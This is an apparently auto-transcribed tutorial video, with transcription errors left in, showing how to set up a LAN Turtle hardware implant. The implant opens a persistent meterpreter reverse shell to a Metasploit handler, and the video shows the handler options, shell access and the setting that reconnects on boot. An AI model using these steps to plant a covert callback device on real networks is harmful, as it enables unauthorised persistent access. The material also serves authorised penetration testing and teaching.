turtle basics in today's lesson we're
going to go ahead and set up our land
turtle to use meterpreter to integrate
with our favorite tool Metasploit so
let's go ahead and get started I have a
couple of virtual machines here first of
all the Windows machine which is already
SS aged into our turtle go ahead and
issue turtle and you can see there I've
got my shell and I have a Kali Linux box
over here so for illustrative purposes
they are both on the same land which
will make this as easy as possible but
otherwise this would work the same if it
was on the internet we would just have
to have an IP on the Internet
so if I run if config I see here I am
1070 331 166 over here let's go ahead
and get our meterpreter set up so in
that case this is our MSF console and
I'm going to use exploit slash multi
slash handler I'm going to set the
payload to PHP interpreter reverse TCP
let's go ahead and show the options they
need to do is set an el host and an el
port so let's set el host and in this
case my IP address 1070 331 166 and set
the El Porto
to 4 4 4 4 there's one other thing I
want to set this not listed here which
is exit on session I want that to be
false all right show our options again
looks good let's go ahead and exploit
this as a job so exploit tak J so now
that's running in the background waiting
for any sessions let's go ahead and at
this point set up our land turtle from
modules we will go ahead and configure
meterpreter this is just like we did
with net cat and very similarly we only
have two things to give it a host and a
port in fact if we come over to help
we'll see some very handy tips as far as
getting this going so again we'll enter
in 10 73 31 166 and pour 444 for the
port save that and let's go ahead and
start this so I'll start and I see that
it was started and immediately on my
meterpreter session I see that
meterpreter session 1 opened let's go
ahead and run sessions
and see I have in fact ID number one and
it is an interpreter and it is at turtle
okay let's go ahead and interact with
this session by doing sessions attack I
and the ID number one and help and see a
couple of commands I can do here let's
for instance do sis info and I can see
here it is a linux box and it is a
turtle fantastic I can go ahead and get
a shell on that turtle and there we are
and it's similar with our net cat
example of my cat slash Etsy slash
banner there we are there I am on my
land turtle from meterpreter so at this
point I'm going to go ahead and exit
this interpreter session so I'll type
exit and immediately you'll notice that
now meterpreter session two opened okay
interesting sessions there it is number
two attack i2 and we're interacting with
two and just as before I can see the sis
info and when I'm done with it I hit its
exit and immediately I get a session
number three opened it so what's
happening here is our meterpreter module
is a being persistent so that's kind of
fantastic just in case anything drops we
can always get it back so let's go ahead
and stop that and you'll notice that the
exploit meterpreter session three died
or exited and the reason is that it died
we can go ahead and hit okay and
likewise we can start it back up and
because the exit on session is set to
false we will continue receiving these
and we'll have them in background able
and all is good so let's go ahead and
now set this up to start on boots so I'm
gonna go ahead and stop this now that I
know that it's working to my liking and
I will enable the service and so at this
point and this is kind of cold there's
no shutdown procedure with the land
turtle you literally just unplug it so
here it is I'll go ahead and unplug it
there we go and I can see that my putty
session failed
oh no and let's go ahead and plug it
back in and in 30 seconds here it'll go
ahead and boot up
and I will keep an eye over here on my
Metasploit and there we have it we have
a new meterpreter session and again just
as before I can interact with it with
attack I number five finishes shell and
go ahead and cat / XE / banner as I like
to do and see that I am in fact on my
land turtle that took about 30 seconds
so drop this on al and it will always
make a connection back over meterpreter
to your session in the cloud and so that
about does it for the meterpreter module
of course leave your feedback and let me
know what you guys think of course you
can find me and more turtle videos just
like these over at Lanter ttle calm</div></div><div class="container-fluid bottom-ad"><div id="amzn-assoc-ad-6a809dda-347a-4187-8a86-91faf94575da"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=6a809dda-347a-4187-8a86-91faf94575da"></script></div><div class="text-center">We are a participant in the Amazon Services LLC Associates Program, an affiliate advertising program designed to provide a means for us to earn fees by linking to Amazon.com and affiliated sites.</div><script>(function(w, d){
